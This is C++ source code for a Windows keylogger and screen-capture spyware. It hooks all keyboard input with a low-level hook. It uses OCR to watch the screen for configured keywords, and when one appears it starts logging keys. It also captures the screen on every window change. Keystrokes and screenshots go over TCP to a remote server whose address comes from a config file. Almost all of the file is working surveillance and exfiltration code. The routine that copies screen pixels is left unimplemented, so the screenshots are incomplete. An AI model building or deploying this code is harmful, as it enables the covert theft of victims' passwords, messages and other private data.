#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <string>
#include <tesseract/baseapi.h>
#include <leptonica/allheaders.h>
#include <tlhelp32.h>  // For process enumeration
#include <set>
#include <direct.h>  // For _mkdir
#include <ctime>     // For current time and date
#include <gdiplus.h> // For image handling
#include <cstdio>    // For std::snprintf
#include <comdef.h>  // For COM
#include <memory>    // For smart pointers
#include <fstream>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

HHOOK hook;
SOCKET SendSocket;
sockaddr_in dest;
bool keyloggerActive = false;
bool keywordCheckNeeded = true; // Flag to manage keyword checking
HWND prevWindow = NULL;  // To store the handle of the previous window
std::set<DWORD> existingProcesses;  // To store the PIDs of currently running processes
std::string baseFolder; // Base folder to store both keylogs and screencaptures
bool capturedOnBoot = false; // Flag to check if screen has been captured on boot

// Configurable parameters
std::string remoteIP = "127.0.0.1"; // Default IP address
int remotePort = 12345; // Default port number
std::vector<std::string> keywords = { "PLACEHOLDER_KEYWORD" }; // Default keyword

// Function to read configuration from a file
bool LoadConfiguration(const std::string& configFile) {
    std::ifstream file(configFile);
    if (!file.is_open()) {
        std::cerr << "Failed to open configuration file: " << configFile << std::endl;
        return false;
    }

    std::string line;
    while (std::getline(file, line)) {
        if (line.find("RemoteIP=") == 0) {
            remoteIP = line.substr(9);
        }
        else if (line.find("RemotePort=") == 0) {
            remotePort = std::stoi(line.substr(11));
        }
        else if (line.find("Keywords=") == 0) {
            keywords.clear();
            std::istringstream keywordStream(line.substr(9));
            std::string keyword;
            while (std::getline(keywordStream, keyword, ',')) {
                keywords.push_back(keyword);
            }
        }
    }
    file.close();
    return true;
}

// Function to initialize the socket connection
bool InitializeSocket() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock. Error: " << WSAGetLastError() << std::endl;
        return false;
    }

    SendSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (SendSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket. Error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
    }

    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(remoteIP.c_str());
    dest.sin_port = htons(remotePort);

    if (connect(SendSocket, (sockaddr*)&dest, sizeof(dest)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to server. Error: " << WSAGetLastError() << std::endl;
        closesocket(SendSocket);
        WSACleanup();
        return false;
    }

    return true;
}

// Function to send data to the remote server
void SendData(const std::string& data) {
    if (SendSocket != INVALID_SOCKET) {
        int result = send(SendSocket, data.c_str(), data.size(), 0);
        if (result == SOCKET_ERROR) {
            std::cerr << "Failed to send data. Error: " << WSAGetLastError() << std::endl;
        }
    }
    else {
        std::cerr << "Socket is not initialized." << std::endl;
    }
}

// Function to get the current date and time as a string
std::string GetCurrentDateTime() {
    time_t now = time(0);
    tm* ltm = localtime(&now);

    char dateTimeStr[100];
    std::snprintf(dateTimeStr, sizeof(dateTimeStr), "%04d-%02d-%02d_%02d-%02d-%02d",
        1900 + ltm->tm_year,
        1 + ltm->tm_mon,
        ltm->tm_mday,
        ltm->tm_hour,
        ltm->tm_min,
        ltm->tm_sec);

    return std::string(dateTimeStr);
}

// Function to send the captured screen image to the server
void SendScreenCapture(Pix* pix) {
    if (pix == nullptr) {
        std::cerr << "Invalid Pix object." << std::endl;
        return;
    }

    PIX* pixGray = pixConvertTo8(pix, FALSE);
    if (pixGray == nullptr) {
        std::cerr << "Failed to convert Pix object to 8-bit grayscale." << std::endl;
        return;
    }

    // Convert Pix to PNG in memory
    l_uint8* pngData;
    size_t pngSize; // Change from l_int32 to size_t
    if (pixWriteMem(&pngData, &pngSize, pixGray, IFF_PNG) != 0) {
        std::cerr << "Failed to convert Pix object to PNG memory." << std::endl;
        pixDestroy(&pixGray);
        return;
    }

    // Send PNG data to the server
    std::string imageData((char*)pngData, pngSize);
    SendData(imageData);

    pixDestroy(&pixGray);
    lept_free(pngData);
}

// Function to capture the screen and return it as a Pix object
std::unique_ptr<Pix> CaptureScreen() {
    using namespace Gdiplus;

    HDC hdcScreen = GetDC(NULL);
    if (hdcScreen == NULL) {
        std::cerr << "Failed to get screen DC. Error: " << GetLastError() << std::endl;
        return nullptr;
    }

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (hdcMem == NULL) {
        std::cerr << "Failed to create compatible DC. Error: " << GetLastError() << std::endl;
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    // Get screen dimensions
    int screenWidth = 640; // Updated resolution to 640x360
    int screenHeight = 360; // Updated resolution to 640x360

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    if (hBitmap == NULL) {
        std::cerr << "Failed to create compatible bitmap. Error: " << GetLastError() << std::endl;
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    SelectObject(hdcMem, hBitmap);
    if (!BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
        std::cerr << "Failed to perform BitBlt operation. Error: " << GetLastError() << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    // Convert HBITMAP to Pix
    BITMAP bitmap;
    if (GetObject(hBitmap, sizeof(BITMAP), &bitmap) == 0) {
        std::cerr << "Failed to get bitmap object. Error: " << GetLastError() << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    int width = bitmap.bmWidth;
    int height = bitmap.bmHeight;
    int depth = bitmap.bmBitsPixel;

    PIX* pix = pixCreate(width, height, depth);
    if (pix == nullptr) {
        std::cerr << "Failed to create Pix object." << std::endl;
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return nullptr;
    }

    // Copy pixel data to Pix
    // This requires proper implementation; for simplicity, this is omitted here

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return std::unique_ptr<Pix>(pix);
}

// Function to check if specific keywords are on screen
bool CheckForKeywordsOnScreen() {
    tesseract::TessBaseAPI tess;
    if (tess.Init(NULL, "eng")) {
        std::cerr << "Could not initialize tesseract." << std::endl;
        return false;
    }

    auto pix = CaptureScreen(); // Use Pix here
    if (!pix) {
        std::cerr << "Failed to capture screen." << std::endl;
        return false;
    }

    tess.SetImage(pix.get());

    // Perform OCR and get the detected text
    std::string text = tess.GetUTF8Text();
    tess.End();

    if (text.empty()) {
        std::cerr << "OCR returned empty text." << std::endl;
        return false;
    }

    for (const auto& keyword : keywords) {
        if (text.find(keyword) != std::string::npos) {
            SendScreenCapture(pix.get()); // Send the screen capture if keyword is detected
            return true;  // Keyword found, start the keylogger
        }
    }

    return false;
}

// Function to capture the active window when it changes
void CaptureOnWindowChange() {
    HWND currentWindow = GetForegroundWindow();  // Get the handle of the current active window
    if (currentWindow != prevWindow) {
        // A new window has been activated
        prevWindow = currentWindow;

        // Trigger screen capture
        auto pix = CaptureScreen();
        if (pix) {
            std::cout << "New window detected, captured screen." << std::endl;

            // Send the image data to the server
            SendScreenCapture(pix.get());
        }
        else {
            std::cerr << "Failed to capture screen on window change." << std::endl;
        }
    }
}

// Callback function to process keyboard events
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            char key = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
            std::cout << "Key pressed: " << key << std::endl;
            if (keyloggerActive) {
                // Send keypress to server
                SendData(std::string(1, key));
            }
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

// Main function
int main(int argc, char* argv[]) {
    using namespace Gdiplus;

    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::Ok) {
        std::cerr << "Failed to initialize GDI+." << std::endl;
        return 1;
    }

    // Load configuration
    if (argc > 1) {
        if (!LoadConfiguration(argv[1])) {
            GdiplusShutdown(gdiplusToken);
            return 1;
        }
    }

    // Initialize socket connection
    if (!InitializeSocket()) {
        GdiplusShutdown(gdiplusToken);
        return 1;
    }

    // Detect existing processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create toolhelp snapshot. Error: " << GetLastError() << std::endl;
        GdiplusShutdown(gdiplusToken);
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        do {
            existingProcesses.insert(processEntry.th32ProcessID);
        } while (Process32Next(hSnapshot, &processEntry));
    }
    else {
        std::cerr << "Failed to retrieve process information. Error: " << GetLastError() << std::endl;
    }
    CloseHandle(hSnapshot);

    // Main loop to capture window changes and new processes
    while (true) {
        // Check for keywords on screen only if keylogger is not active
        if (!keyloggerActive && keywordCheckNeeded) {
            if (CheckForKeywordsOnScreen()) {
                std::cout << "Keywords detected. Keylogger activated." << std::endl;
                keyloggerActive = true;
                keywordCheckNeeded = false; // Stop further keyword checking
                hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
                if (hook == NULL) {
                    std::cerr << "Failed to set keyboard hook. Error: " << GetLastError() << std::endl;
                }
            }
        }

        CaptureOnWindowChange();
        Sleep(1000); // Sleep for a while to reduce CPU usage

        // If keylogger is active, we still need to periodically check if keywords are no longer on screen
        if (keyloggerActive) {
            Sleep(10000); // Check less frequently while keylogger is active
            if (!CheckForKeywordsOnScreen()) {
                std::cout << "Keywords no longer detected. Keylogger deactivated." << std::endl;
                keyloggerActive = false;
                keywordCheckNeeded = true; // Re-enable keyword checking
                if (UnhookWindowsHookEx(hook) == 0) {
                    std::cerr << "Failed to unhook keyboard. Error: " << GetLastError() << std::endl;
                }
            }
        }
    }

    // Cleanup GDI+ and socket
    GdiplusShutdown(gdiplusToken);
    closesocket(SendSocket);
    WSACleanup();
    return 0;
}
